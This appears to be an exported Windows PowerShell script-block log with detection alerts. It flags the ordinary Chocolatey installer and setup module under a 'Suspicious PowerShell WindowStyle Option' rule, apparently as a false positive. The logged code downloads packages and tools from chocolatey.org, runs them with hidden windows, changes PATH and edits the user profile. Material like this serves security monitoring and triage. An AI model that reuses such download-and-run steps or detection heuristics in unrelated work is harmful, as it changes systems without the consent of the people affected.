choco.exe.old so we can place the new version here."" # rename the currently running process / it will be locked if it exists $chocoExe = Join-Path $chocolateyPath 'choco.exe' if (Test-Path ($chocoExe)) { Write-Debug ""Renaming '$chocoExe' to '$chocoExe.old'"" try { Remove-Item ""$chocoExe.old"" -force -ErrorAction SilentlyContinue Move-Item $chocoExe ""$chocoExe.old"" -force -ErrorAction SilentlyContinue } catch { Write-ChocolateyWarning ""Was not able to rename `'$chocoExe`' to `'$chocoExe.old`'."" } } # remove pdb file if it is found $chocoPdb = Join-Path $chocolateyPath 'choco.pdb' if (Test-Path ($chocoPdb)) { Remove-Item ""$chocoPdb"" -Force -ErrorAction SilentlyContinue } Write-Debug ""Unpacking files required for Chocolatey."" $chocInstallFolder = Join-Path $thisScriptFolder ""chocolateyInstall"" $chocoExe = Join-Path $chocInstallFolder 'choco.exe' $chocoExeDest = Join-Path $chocolateyPath 'choco.exe' Copy-Item $chocoExe $chocoExeDest -force Write-Debug ""Copying the contents of `'$chocInstallFolder`' to `'$chocolateyPath`'."" Copy-Item $chocInstallFolder\* $chocolateyPath -Recurse -Force } function Ensure-ChocolateyLibFiles { param( [string]$chocolateyLibPath ) Write-Debug ""Ensure-ChocolateyLibFiles"" $chocoPkgDirectory = Join-Path $chocolateyLibPath 'chocolatey' Create-DirectoryIfNotExists $chocoPkgDirectory if (!(Test-Path(""$chocoPkgDirectory\chocolatey.nupkg""))) { Write-Output ""chocolatey.nupkg file not installed in lib.`n Attempting to locate it from bootstrapper."" $chocoZipFile = Join-Path $tempDir ""chocolatey\chocInstall\chocolatey.zip"" Write-Debug ""First the zip file at '$chocoZipFile'."" Write-Debug ""Then from a neighboring chocolatey.*nupkg file '$thisScriptFolder/../../'."" if (Test-Path(""$chocoZipFile"")) { Write-Debug ""Copying '$chocoZipFile' to '$chocoPkgDirectory\chocolatey.nupkg'."" Copy-Item ""$chocoZipFile"" ""$chocoPkgDirectory\chocolatey.nupkg"" -Force -ErrorAction SilentlyContinue } if (!(Test-Path(""$chocoPkgDirectory\chocolatey.nupkg""))) { $chocoPkg = Get-ChildItem ""$thisScriptFolder/../../"" | ?{$_.name -match ""^chocolatey.*nupkg"" } | Sort name -Descending | Select -First 1 if ($chocoPkg -ne '') { $chocoPkg = $chocoPkg.FullName } ""$chocoZipFile"", ""$chocoPkg"" | % { if ($_ -ne $null -and $_ -ne '') { if (Test-Path $_) { Write-Debug ""Copying '$_' to '$chocoPkgDirectory\chocolatey.nupkg'."" Copy-Item $_ ""$chocoPkgDirectory\chocolatey.nupkg"" -Force -ErrorAction SilentlyContinue } } } } } } function Install-ChocolateyBinFiles { param( [string] $chocolateyPath, [string] $chocolateyExePath ) Write-Debug ""Install-ChocolateyBinFiles"" Write-Debug ""Installing the bin file redirects"" $redirectsPath = Join-Path $chocolateyPath 'redirects' if (!(Test-Path ""$redirectsPath"")) { Write-ChocolateyWarning ""$redirectsPath does not exist"" return } $exeFiles = Get-ChildItem ""$redirectsPath"" -include @(""*.exe"",""*.cmd"") -recurse foreach ($exeFile in $exeFiles) { $exeFilePath = $exeFile.FullName $exeFileName = [System.IO.Path]::GetFileName(""$exeFilePath"") $binFilePath = Join-Path $chocolateyExePath $exeFileName $binFilePathRename = $binFilePath + '.old' $batchFilePath = $binFilePath.Replace("".exe"","".bat"") $bashFilePath = $binFilePath.Replace("".exe"","""") if (Test-Path ($batchFilePath)) { Remove-Item $batchFilePath -force -ErrorAction SilentlyContinue } if (Test-Path ($bashFilePath)) { Remove-Item $bashFilePath -force -ErrorAction SilentlyContinue } if (Test-Path ($binFilePathRename)) { try { Write-Debug ""Attempting to remove $binFilePathRename"" Remove-Item $binFilePathRename -force -ErrorAction Stop } catch { Write-ChocolateyWarning ""Was not able to remove `'$binFilePathRename`'. This may cause errors."" } } if (Test-Path ($binFilePath)) { try { Write-Debug ""Attempting to rename $binFilePath to $binFilePathRename"" Move-Item -path $binFilePath -destination $binFilePathRename -force -ErrorAction Stop } catch { Write-ChocolateyWarning ""Was not able to rename `'$binFilePath`' to `'$binFilePathRename`'."" } } try { Write-Debug ""Attempting to copy $exeFilePath to $binFilePath"" Copy-Item -path $exeFilePath -destination $binFilePath -force -ErrorAction Stop } catch { Write-ChocolateyWarning ""Was not able to replace `'$binFilePath`' with `'$exeFilePath`'. You may need to do this manually."" } $commandShortcut = [System.IO.Path]::GetFileNameWithoutExtension(""$exeFilePath"") Write-Debug ""Added command $commandShortcut"" } } function Initialize-ChocolateyPath { param( [string]$chocolateyExePath = ""$($env:ALLUSERSPROFILE)\chocolatey\bin"", [string]$chocolateyExePathVariable = ""%$($chocInstallVariableName)%\bin"" ) Write-Debug ""Initialize-ChocolateyPath"" Write-Debug ""Initializing Chocolatey Path if required"" $environmentTarget = [System.EnvironmentVariableTarget]::User if (Test-ProcessAdminRights) { Write-Debug ""Administrator installing so using Machine environment variable target instead of User."" $environmentTarget = [System.EnvironmentVariableTarget]::Machine } else { Write-ChocolateyWarning ""Setting ChocolateyInstall Path on USER PATH and not SYSTEM Path.`n This is due to either non-administrator install OR the process you are running is not being run as an Administrator."" } Install-ChocolateyPath -pathToInstall ""$chocolateyExePath"" -pathType $environmentTarget } function Process-ChocolateyBinFiles { param( [string]$chocolateyExePath = ""$($env:ALLUSERSPROFILE)\chocolatey\bin"", [string]$chocolateyExePathVariable = ""%$($chocInstallVariableName)%\bin"" ) Write-Debug ""Process-ChocolateyBinFiles"" $processedMarkerFile = Join-Path $chocolateyExePath '_processed.txt' if (!(test-path $processedMarkerFile)) { $files = get-childitem $chocolateyExePath -include *.bat -recurse if ($files -ne $null -and $files.Count -gt 0) { Write-Debug ""Processing Bin files"" foreach ($file in $files) { Write-Output ""Processing $($file.Name) to make it portable"" $fileStream = [System.IO.File]::Open(""$file"", 'Open', 'Read', 'ReadWrite') $reader = New-Object System.IO.StreamReader($fileStream) $fileText = $reader.ReadToEnd() $reader.Close() $fileStream.Close() $fileText = $fileText.ToLower().Replace(""`"""" + $chocolateyPath.ToLower(), ""SET DIR=%~dp0%`n""""%DIR%..\"").Replace(""\\"",""\"") Set-Content $file -Value $fileText -Encoding Ascii } } Set-Content $processedMarkerFile -Value ""$([System.DateTime]::Now.Date)"" -Encoding Ascii } } # Adapted from http://www.west-wind.com/Weblog/posts/197245.aspx function Get-FileEncoding($Path) { $bytes = [byte[]](Get-Content $Path -Encoding byte -ReadCount 4 -TotalCount 4) if(!$bytes) { return 'utf8' } switch -regex ('{0:x2}{1:x2}{2:x2}{3:x2}' -f $bytes[0],$bytes[1],$bytes[2],$bytes[3]) { '^efbbbf' { return 'utf8' } '^2b2f76' { return 'utf7' } '^fffe' { return 'unicode' } '^feff' { return 'bigendianunicode' } '^0000feff' { return 'utf32' } default { return 'ascii' } } } function Add-ChocolateyProfile { Write-Debug ""Add-ChocolateyProfile"" try { $profileFile = ""$profile"" if ($profileFile -eq $null -or $profileFile -eq '') { Write-Output 'Not setting tab completion: Profile variable ($profile) resulted in an empty string.' return } $profileDirectory = (Split-Path -Parent $profileFile) if ($env:ChocolateyNoProfile -ne $null -and $env:ChocolateyNoProfile -ne '') { Write-Warning ""Not setting tab completion: Environment variable ""ChocolateyNoProfile"" exists and is set."" return } $localSystem = Get-LocalizedWellKnownPrincipalName -WellKnownSidType ([Security.Principal.WellKnownSidType]::LocalSystemSid) # get current user $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent() if ($currentUser.Name -eq $localSystem) { Write-Warning ""Not setting tab completion: Current user is SYSTEM user."" return } if (!(Test-Path($profileDirectory))) { Write-Debug ""Creating '$profileDirectory'"" New-Item ""$profileDirectory"" -Type Directory -Force -ErrorAction SilentlyContinue | Out-Null } if (!(Test-Path($profileFile))) { Write-Warning ""Not setting tab completion: Profile file does not exist at '$profileFile'."" return #Write-Debug ""Creating '$profileFile'"" #"""" | Out-File $profileFile -Encoding UTF8 } # Check authenticode, but only if file is greater than 4 bytes $profileFileInfo = New-Object System.IO.FileInfo($profileFile) if ($profileFileInfo.Length -ge 5) { $signature = Get-AuthenticodeSignature $profile if ($signature.Status -ne 'NotSigned') { Write-Warning ""Not setting tab completion: File is Authenticode signed at '$profile'."" return } } $profileInstall = @' # Chocolatey profile $ChocolateyProfile = ""$env:ChocolateyInstall\helpers\chocolateyProfile.psm1"" if (Test-Path($ChocolateyProfile)) { Import-Module ""$ChocolateyProfile"" } '@ $chocoProfileSearch = '$ChocolateyProfile' if(Select-String -Path $profileFile -Pattern $chocoProfileSearch -Quiet -SimpleMatch) { Write-Debug ""Chocolatey profile is already installed."" return } Write-Output 'Adding Chocolatey to the profile. This will provide tab completion, refreshenv, etc.' $profileInstall | Out-File $profileFile -Append -Encoding (Get-FileEncoding $profileFile) Write-ChocolateyWarning 'Chocolatey profile installed. Reload your profile - type . $profile' if ($PSVersionTable.PSVersion.Major -lt 3) { Write-ChocolateyWar","MessageNumber: 2 ¦ MessageTotal: 4 ¦ Path: C:\Users\IEUser\AppData\Local\Temp\chocolatey\chocInstall\tools\chocolateysetup.psm1 ¦ ScriptBlockId: bb48825e-ea49-4f0d-bb5c-2b2443dd9239 ¦ ScriptBlockText: )?', '', [System.Text.RegularExpressions.RegexOptions]::IgnoreCase) if ($updatedPath -ne $path) { Write-Output ""Updating `'$_`' PATH to reflect removal of '$chocolateyPathOld'."" try { Set-EnvironmentVariable -Name 'Path' -Value $updatedPath -Scope $_ -ErrorAction Stop } catch { Write-ChocolateyWarning ""Was not able to remove the old environment variable from PATH. You will need to do this manually"" } } } Copy-Item ""$chocolateyPathOld\lib\*"" ""$chocolateyPath\lib"" -force -recurse $from = ""$chocolateyPathOld\bin"" $to = ""$chocolateyPath\bin"" $exclude = @(""choco.exe"", ""chocolatey.exe"", ""cinst.exe"", ""clist.exe"", ""cpack.exe"", ""cpush.exe"", ""cuninst.exe"", ""cup.exe"", ""cver.exe"", ""RefreshEnv.cmd"") Get-ChildItem -Path $from -recurse -Exclude $exclude | % { Write-Debug ""Copying $_ `n to $to"" if ($_.PSIsContainer) { Copy-Item $_ -Destination (Join-Path $to $_.Parent.FullName.Substring($from.length)) -Force -ErrorAction SilentlyContinue } else { $fileToMove = (Join-Path $to $_.FullName.Substring($from.length)) try { Copy-Item $_ -Destination $fileToMove -Exclude $exclude -Force -ErrorAction Stop } catch { Write-ChocolateyWarning ""Was not able to move `'$fileToMove`'. You may need to reinstall the shim"" } } } } } function Remove-OldChocolateyInstall { param( [string]$chocolateyPathOld = ""$sysDrive\Chocolatey"" ) Write-Debug ""Remove-OldChocolateyInstall"" if (Test-Path $chocolateyPathOld) { Write-ChocolateyWarning ""This action will result in Log Errors, you can safely ignore those. `n You may need to finish removing '$chocolateyPathOld' manually."" try { Get-ChildItem -Path ""$chocolateyPathOld"" | % { if (Test-Path $_.FullName) { Write-Debug ""Removing $_ unless matches .log"" Remove-Item $_.FullName -exclude *.log -recurse -force -ErrorAction SilentlyContinue } } Write-Output ""Attempting to remove `'$chocolateyPathOld`'. This may fail if something in the folder is being used or locked."" Remove-Item ""$($chocolateyPathOld)"" -force -recurse -ErrorAction Stop } catch { Write-ChocolateyWarning ""Was not able to remove `'$chocolateyPathOld`'. You will need to manually remove it."" } } } function Install-ChocolateyFiles { param( [string]$chocolateyPath ) Write-Debug ""Install-ChocolateyFiles"" Write-Debug ""Removing install files in chocolateyInstall, helpers, redirects, and tools"" ""$chocolateyPath\chocolateyInstall"", ""$chocolateyPath\helpers"", ""$chocolateyPath\redirects"", ""$chocolateyPath\tools"" | % { #Write-Debug ""Checking path $_"" if (Test-Path $_) { Get-ChildItem -Path ""$_"" | % { #Write-Debug ""Checking child path $_ ($($_.FullName))"" if (Test-Path $_.FullName) { Write-Debug ""Removing $_ unless matches .log"" Remove-Item $_.FullName -exclude *.log -recurse -force -ErrorAction SilentlyContinue } } } } Write-Debug ""Attempting to move choco.exe to choco.exe.old so we can place the new version here."" # rename the currently running process / it will be locked if it exists $chocoExe = Join-Path $chocolateyPath 'choco.exe' if (Test-Path ($chocoExe)) { Write-Debug ""Renaming '$chocoExe' to '$chocoExe.old'"" try { Remove-Item ""$chocoExe.old"" -force -ErrorAction SilentlyContinue Move-Item $chocoExe ""$chocoExe.old"" -force -ErrorAction SilentlyContinue } catch { Write-ChocolateyWarning ""Was not able to rename `'$chocoExe`' to `'$chocoExe.old`'."" } } # remove pdb file if it is found $chocoPdb = Join-Path $chocolateyPath 'choco.pdb' if (Test-Path ($chocoPdb)) { Remove-Item ""$chocoPdb"" -Force -ErrorAction SilentlyContinue } Write-Debug ""Unpacking files required for Chocolatey."" $chocInstallFolder = Join-Path $thisScriptFolder ""chocolateyInstall"" $chocoExe = Join-Path $chocInstallFolder 'choco.exe' $chocoExeDest = Join-Path $chocolateyPath 'choco.exe' Copy-Item $chocoExe $chocoExeDest -force Write-Debug ""Copying the contents of `'$chocInstallFolder`' to `'$chocolateyPath`'."" Copy-Item $chocInstallFolder\* $chocolateyPath -Recurse -Force } function Ensure-ChocolateyLibFiles { param( [string]$chocolateyLibPath ) Write-Debug ""Ensure-ChocolateyLibFiles"" $chocoPkgDirectory = Join-Path $chocolateyLibPath 'chocolatey' Create-DirectoryIfNotExists $chocoPkgDirectory if (!(Test-Path(""$chocoPkgDirectory\chocolatey.nupkg""))) { Write-Output ""chocolatey.nupkg file not installed in lib.`n Attempting to locate it from bootstrapper."" $chocoZipFile = Join-Path $tempDir ""chocolatey\chocInstall\chocolatey.zip"" Write-Debug ""First the zip file at '$chocoZipFile'."" Write-Debug ""Then from a neighboring chocolatey.*nupkg file '$thisScriptFolder/../../'."" if (Test-Path(""$chocoZipFile"")) { Write-Debug ""Copying '$chocoZipFile' to '$chocoPkgDirectory\chocolatey.nupkg'."" Copy-Item ""$chocoZipFile"" ""$chocoPkgDirectory\chocolatey.nupkg"" -Force -ErrorAction SilentlyContinue } if (!(Test-Path(""$chocoPkgDirectory\chocolatey.nupkg""))) { $chocoPkg = Get-ChildItem ""$thisScriptFolder/../../"" | ?{$_.name -match ""^chocolatey.*nupkg"" } | Sort name -Descending | Select -First 1 if ($chocoPkg -ne '') { $chocoPkg = $chocoPkg.FullName } ""$chocoZipFile"", ""$chocoPkg"" | % { if ($_ -ne $null -and $_ -ne '') { if (Test-Path $_) { Write-Debug ""Copying '$_' to '$chocoPkgDirectory\chocolatey.nupkg'."" Copy-Item $_ ""$chocoPkgDirectory\chocolatey.nupkg"" -Force -ErrorAction SilentlyContinue } } } } } } function Install-ChocolateyBinFiles { param( [string] $chocolateyPath, [string] $chocolateyExePath ) Write-Debug ""Install-ChocolateyBinFiles"" Write-Debug ""Installing the bin file redirects"" $redirectsPath = Join-Path $chocolateyPath 'redirects' if (!(Test-Path ""$redirectsPath"")) { Write-ChocolateyWarning ""$redirectsPath does not exist"" return } $exeFiles = Get-ChildItem ""$redirectsPath"" -include @(""*.exe"",""*.cmd"") -recurse foreach ($exeFile in $exeFiles) { $exeFilePath = $exeFile.FullName $exeFileName = [System.IO.Path]::GetFileName(""$exeFilePath"") $binFilePath = Join-Path $chocolateyExePath $exeFileName $binFilePathRename = $binFilePath + '.old' $batchFilePath = $binFilePath.Replace("".exe"","".bat"") $bashFilePath = $binFilePath.Replace("".exe"","""") if (Test-Path ($batchFilePath)) { Remove-Item $batchFilePath -force -ErrorAction SilentlyContinue } if (Test-Path ($bashFilePath)) { Remove-Item $bashFilePath -force -ErrorAction SilentlyContinue } if (Test-Path ($binFilePathRename)) { try { Write-Debug ""Attempting to remove $binFilePathRename"" Remove-Item $binFilePathRename -force -ErrorAction Stop } catch { Write-ChocolateyWarning ""Was not able to remove `'$binFilePathRename`'. This may cause errors."" } } if (Test-Path ($binFilePath)) { try { Write-Debug ""Attempting to rename $binFilePath to $binFilePathRename"" Move-Item -path $binFilePath -destination $binFilePathRename -force -ErrorAction Stop } catch { Write-ChocolateyWarning ""Was not able to rename `'$binFilePath`' to `'$binFilePathRename`'."" } } try { Write-Debug ""Attempting to copy $exeFilePath to $binFilePath"" Copy-Item -path $exeFilePath -destination $binFilePath -force -ErrorAction Stop } catch { Write-ChocolateyWarning ""Was not able to replace `'$binFilePath`' with `'$exeFilePath`'. You may need to do this manually."" } $commandShortcut = [System.IO.Path]::GetFileNameWithoutExtension(""$exeFilePath"") Write-Debug ""Added command $commandShortcut"" } } function Initialize-ChocolateyPath { param( [string]$chocolateyExePath = ""$($env:ALLUSERSPROFILE)\chocolatey\bin"", [string]$chocolateyExePathVariable = ""%$($chocInstallVariableName)%\bin"" ) Write-Debug ""Initialize-ChocolateyPath"" Write-Debug ""Initializing Chocolatey Path if required"" $environmentTarget = [System.EnvironmentVariableTarget]::User if (Test-ProcessAdminRights) { Write-Debug ""Administrator installing so using Machine environment variable target instead of User."" $environmentTarget = [System.EnvironmentVariableTarget]::Machine } else { Write-ChocolateyWarning ""Setting ChocolateyInstall Path on USER PATH and not SYSTEM Path.`n This is due to either non-administrator install OR the process you are running is not being run as an Administrator."" } Install-ChocolateyPath -pathToInstall ""$chocolateyExePath"" -pathType $environmentTarget } function Process-ChocolateyBinFiles { param( [string]$chocolateyExePath = ""$($env:ALLUSERSPROFILE)\chocolatey\bin"", [string]$chocolateyExePathVariable = ""%$($chocInstallVariableName)%\bin"" ) Write-Debug ""Process-ChocolateyBinFiles"" $processedMarkerFile = Join-Path $chocolateyExePath '_processed.txt' if (!(test-path $processedMarkerFile)) { $files = get-childitem $chocolateyExePath -include *.bat -recurse if ($files -ne $null -and $files.Count -gt 0) { Write-Debug ""Processing Bin files"" foreach ($file in $files) { Write-Output ""Processing $($file.Name) to make it portable"" $fileStream = [System.IO.File]::Open(""$file"", 'Open', 'Read', 'ReadWrite') $reader = New-Object System.IO.StreamReader($fileStream) $fileText = $reader.ReadToEnd() $reader.Close() $fileStream.Close() $fileText = $fileText.ToLower().Replace(""`"""" + $chocolateyPath.ToLower(), ""SET DIR=%~dp0%`n""""%DIR%..\"").Replace(""\\"",""\"") Set-Content $file -Value $fileText -Encoding Ascii } } Set-Content $processedMarkerFile -Value ""$([System.DateTime]::Now.Date)"" -Encoding Ascii } } # Adapted from http://www.west-wind.com/Weblog/posts/197245.aspx function Get-FileEncoding($Path) { $bytes = [byte[]](Get-Content $Path -Encoding byte -ReadCount 4 -TotalCount 4) if(!$bytes) { return 'utf8' } switch -regex ('{0:x2}{1:x2}{2:x2}{3:x2}' -f $bytes[0],$bytes[1],$bytes[2],$bytes[3]) { '^efbbbf' { return 'utf8' } '^2b2f76' { return 'utf7' } '^fffe' { return 'unicode' } '^feff' { return 'bigendianunicode' } '^0000feff' { return 'utf32' } default { return 'ascii' } } } function Add-ChocolateyProfile { Write-Debug ""Add-ChocolateyProfile"" try { $profileFile = ""$profile"" if ($profileFile -eq $null -or $profileFile -eq '') { Write-Output 'Not setting tab completion: Profile variable ($profile) resulted in an empty string.' return } $profileDirectory = (Split-Path -Parent $profileFile) if ($env:ChocolateyNoProfile -ne $null -and $env:ChocolateyNoProfile -ne '') { Write-Warning ""Not setting tab completion: Environment variable ""ChocolateyNoProfile"" exists and is set."" return } $localSystem = Get-LocalizedWellKnownPrincipalName -WellKnownSidType ([Security.Principal.WellKnownSidType]::LocalSystemSid) # get current user $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent() if ($currentUser.Name -eq $localSystem) { Write-Warning ""Not setting tab completion: Current user is SYSTEM user."" return } if (!(Test-Path($profileDirectory))) { Write-Debug ""Creating '$profileDirectory'"" New-Item ""$profileDirectory"" -Type Directory -Force -ErrorAction SilentlyContinue | Out-Null } if (!(Test-Path($profileFile))) { Write-Warning ""Not setting tab completion: Profile file does not exist at '$profileFile'."" return #Write-Debug ""Creating '$profileFile'"" #"""" | Out-File $profileFile -Encoding UTF8 } # Check authenticode, but only if file is greater than 4 bytes $profileFileInfo = New-Object System.IO.FileInfo($profileFile) if ($profileFileInfo.Length -ge 5) { $signature = Get-AuthenticodeSignature $profile if ($signature.Status -ne 'NotSigned') { Write-Warning ""Not setting tab completion: File is Authenticode signed at '$profile'."" return } } $profileInstall = @' # Chocolatey profile $ChocolateyProfile = ""$env:ChocolateyInstall\helpers\chocolateyProfile.psm1"" if (Test-Path($ChocolateyProfile)) { Import-Module ""$ChocolateyProfile"" } '@ $chocoProfileSearch = '$ChocolateyProfile' if(Select-String -Path $profileFile -Pattern $chocoProfileSearch -Quiet -SimpleMatch) { Write-Debug ""Chocolatey profile is already installed."" return } Write-Output 'Adding Chocolatey to the profile. This will provide tab completion, refreshenv, etc.' $profileInstall | Out-File $profileFile -Append -Encoding (Get-FileEncoding $profileFile) Write-ChocolateyWarning 'Chocolatey profile installed. Reload your profile - type . $profile' if ($PSVersionTable.PSVersion.Major -lt 3) { Write-ChocolateyWar","f9889db2-6490-a082-33a3-1b46dff5e2f1"
"2019-03-19 14:21:27.639 +01:00","Suspicious PowerShell WindowStyle Option","med","MSEDGEWIN10","PwSh",4104,51,"ScriptBlock: # ===================================================================== # Copyright 2017 - Present Chocolatey Software, Inc, and the # original authors/contributors from ChocolateyGallery # Copyright 2011 - 2017 RealDimensions Software, LLC, and the # original authors/contributors from ChocolateyGallery # at https://github.com/chocolatey/chocolatey.org # # Licensed under the Apache License, Version 2.0 (the ""License""); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an ""AS IS"" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. # ===================================================================== # For organizational deployments of Chocolatey, please see https://chocolatey.org/docs/how-to-setup-offline-installation # Environment Variables, specified as $env:NAME in PowerShell.exe and %NAME% in cmd.exe. # For explicit proxy, please set $env:chocolateyProxyLocation and optionally $env:chocolateyProxyUser and $env:chocolateyProxyPassword # For an explicit version of Chocolatey, please set $env:chocolateyVersion = 'versionnumber' # To target a different url for chocolatey.nupkg, please set $env:chocolateyDownloadUrl = 'full url to nupkg file' # NOTE: $env:chocolateyDownloadUrl does not work with $env:chocolateyVersion. # To use built-in compression instead of 7zip (requires additional download), please set $env:chocolateyUseWindowsCompression = 'true' # To bypass the use of any proxy, please set $env:chocolateyIgnoreProxy = 'true' #specifically use the API to get the latest version (below) $url = '' $chocolateyVersion = $env:chocolateyVersion if (![string]::IsNullOrEmpty($chocolateyVersion)){ Write-Output ""Downloading specific version of Chocolatey: $chocolateyVersion"" $url = ""https://chocolatey.org/api/v2/package/chocolatey/$chocolateyVersion"" } $chocolateyDownloadUrl = $env:chocolateyDownloadUrl if (![string]::IsNullOrEmpty($chocolateyDownloadUrl)){ Write-Output ""Downloading Chocolatey from : $chocolateyDownloadUrl"" $url = ""$chocolateyDownloadUrl"" } if ($env:TEMP -eq $null) { $env:TEMP = Join-Path $env:SystemDrive 'temp' } $chocTempDir = Join-Path $env:TEMP ""chocolatey"" $tempDir = Join-Path $chocTempDir ""chocInstall"" if (![System.IO.Directory]::Exists($tempDir)) {[void][System.IO.Directory]::CreateDirectory($tempDir)} $file = Join-Path $tempDir ""chocolatey.zip"" # PowerShell v2/3 caches the output stream. Then it throws errors due # to the FileStream not being what is expected. Fixes ""The OS handle's # position is not what FileStream expected. Do not use a handle # simultaneously in one FileStream and in Win32 code or another # FileStream."" function Fix-PowerShellOutputRedirectionBug { $poshMajorVerion = $PSVersionTable.PSVersion.Major if ($poshMajorVerion -lt 4) { try{ # http://www.leeholmes.com/blog/2008/07/30/workaround-the-os-handles-position-is-not-what-filestream-expected/ plus comments $bindingFlags = [Reflection.BindingFlags] ""Instance,NonPublic,GetField"" $objectRef = $host.GetType().GetField(""externalHostRef"", $bindingFlags).GetValue($host) $bindingFlags = [Reflection.BindingFlags] ""Instance,NonPublic,GetProperty"" $consoleHost = $objectRef.GetType().GetProperty(""Value"", $bindingFlags).GetValue($objectRef, @()) [void] $consoleHost.GetType().GetProperty(""IsStandardOutputRedirected"", $bindingFlags).GetValue($consoleHost, @()) $bindingFlags = [Reflection.BindingFlags] ""Instance,NonPublic,GetField"" $field = $consoleHost.GetType().GetField(""standardOutputWriter"", $bindingFlags) $field.SetValue($consoleHost, [Console]::Out) [void] $consoleHost.GetType().GetProperty(""IsStandardErrorRedirected"", $bindingFlags).GetValue($consoleHost, @()) $field2 = $consoleHost.GetType().GetField(""standardErrorWriter"", $bindingFlags) $field2.SetValue($consoleHost, [Console]::Error) } catch { Write-Output ""Unable to apply redirection fix."" } } } Fix-PowerShellOutputRedirectionBug # Attempt to set highest encryption available for SecurityProtocol. # PowerShell will not set this by default (until maybe .NET 4.6.x). This # will typically produce a message for PowerShell v2 (just an info # message though) try { # Set TLS 1.2 (3072), then TLS 1.1 (768), then TLS 1.0 (192), finally SSL 3.0 (48) # Use integers because the enumeration values for TLS 1.2 and TLS 1.1 won't # exist in .NET 4.0, even though they are addressable if .NET 4.5+ is # installed (.NET 4.5 is an in-place upgrade). [System.Net.ServicePointManager]::SecurityProtocol = 3072 -bor 768 -bor 192 -bor 48 } catch { Write-Output 'Unable to set PowerShell to use TLS 1.2 and TLS 1.1 due to old .NET Framework installed. If you see underlying connection closed or trust errors, you may need to do one or more of the following: (1) upgrade to .NET Framework 4.5+ and PowerShell v3, (2) specify internal Chocolatey package location (set $env:chocolateyDownloadUrl prior to install or host the package internally), (3) use the Download + PowerShell method of install. See https://chocolatey.org/install for all install options.' } function Get-Downloader { param ( [string]$url ) $downloader = new-object System.Net.WebClient $defaultCreds = [System.Net.CredentialCache]::DefaultCredentials if ($defaultCreds -ne $null) { $downloader.Credentials = $defaultCreds } $ignoreProxy = $env:chocolateyIgnoreProxy if ($ignoreProxy -ne $null -and $ignoreProxy -eq 'true') { Write-Debug ""Explicitly bypassing proxy due to user environment variable"" $downloader.Proxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy() } else { # check if a proxy is required $explicitProxy = $env:chocolateyProxyLocation $explicitProxyUser = $env:chocolateyProxyUser $explicitProxyPassword = $env:chocolateyProxyPassword if ($explicitProxy -ne $null -and $explicitProxy -ne '') { # explicit proxy $proxy = New-Object System.Net.WebProxy($explicitProxy, $true) if ($explicitProxyPassword -ne $null -and $explicitProxyPassword -ne '') { $passwd = ConvertTo-SecureString $explicitProxyPassword -AsPlainText -Force $proxy.Credentials = New-Object System.Management.Automation.PSCredential ($explicitProxyUser, $passwd) } Write-Debug ""Using explicit proxy server '$explicitProxy'."" $downloader.Proxy = $proxy } elseif (!$downloader.Proxy.IsBypassed($url)) { # system proxy (pass through) $creds = $defaultCreds if ($creds -eq $null) { Write-Debug ""Default credentials were null. Attempting backup method"" $cred = get-credential $creds = $cred.GetNetworkCredential(); } $proxyaddress = $downloader.Proxy.GetProxy($url).Authority Write-Debug ""Using system proxy server '$proxyaddress'."" $proxy = New-Object System.Net.WebProxy($proxyaddress) $proxy.Credentials = $creds $downloader.Proxy = $proxy } } return $downloader } function Download-String { param ( [string]$url ) $downloader = Get-Downloader $url return $downloader.DownloadString($url) } function Download-File { param ( [string]$url, [string]$file ) #Write-Output ""Downloading $url to $file"" $downloader = Get-Downloader $url $downloader.DownloadFile($url, $file) } if ($url -eq $null -or $url -eq '') { Write-Output ""Getting latest version of the Chocolatey package for download."" $url = 'https://chocolatey.org/api/v2/Packages()?$filter=((Id%20eq%20%27chocolatey%27)%20and%20(not%20IsPrerelease))%20and%20IsLatestVersion' [xml]$result = Download-String $url $url = $result.feed.entry.content.src } # Download the Chocolatey package Write-Output ""Getting Chocolatey from $url."" Download-File $url $file # Determine unzipping method # 7zip is the most compatible so use it by default $7zaExe = Join-Path $tempDir '7za.exe' $unzipMethod = '7zip' $useWindowsCompression = $env:chocolateyUseWindowsCompression if ($useWindowsCompression -ne $null -and $useWindowsCompression -eq 'true') { Write-Output 'Using built-in compression to unzip' $unzipMethod = 'builtin' } elseif (-Not (Test-Path ($7zaExe))) { Write-Output ""Downloading 7-Zip commandline tool prior to extraction."" # download 7zip Download-File 'https://chocolatey.org/7za.exe' ""$7zaExe"" } # unzip the package Write-Output ""Extracting $file to $tempDir..."" if ($unzipMethod -eq '7zip') { $params = ""x -o`""$tempDir`"" -bd -y `""$file`"""" # use more robust Process as compared to Start-Process -Wait (which doesn't # wait for the process to finish in PowerShell v3) $process = New-Object System.Diagnostics.Process $process.StartInfo = New-Object System.Diagnostics.ProcessStartInfo($7zaExe, $params) $process.StartInfo.RedirectStandardOutput = $true $process.StartInfo.UseShellExecute = $false $process.StartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden $process.Start() | Out-Null $process.BeginOutputReadLine() $process.WaitForExit() $exitCode = $process.ExitCode $process.Dispose() $errorMessage = ""Unable to unzip package using 7zip. Perhaps try setting `$env:chocolateyUseWindowsCompression = 'true' and call install again. Error:"" switch ($exitCode) { 0 { break } 1 { throw ""$errorMessage Some files could not be extracted"" } 2 { throw ""$errorMessage 7-Zip encountered a fatal error while extracting the files"" } 7 { throw ""$errorMessage 7-Zip command line error"" } 8 { throw ""$errorMessage 7-Zip out of memory"" } 255 { throw ""$errorMessage Extraction cancelled by the user"" } default { throw ""$errorMessage 7-Zip signalled an unknown error (code $exitCode)"" } } } else { if ($PSVersionTable.PSVersion.Major -lt 5) { try { $shellApplication = new-object -com shell.application $zipPackage = $shellApplication.NameSpace($file) $destinationFolder = $shellApplication.NameSpace($tempDir) $destinationFolder.CopyHere($zipPackage.Items(),0x10) } catch { throw ""Unable to unzip package using built-in compression. Set `$env:chocolateyUseWindowsCompression = 'false' and call install again to use 7zip to unzip. Error: `n $_"" } } else { Expand-Archive -Path ""$file"" -DestinationPath ""$tempDir"" -Force } } # Call chocolatey install Write-Output ""Installing chocolatey on this machine"" $toolsFolder = Join-Path $tempDir ""tools"" 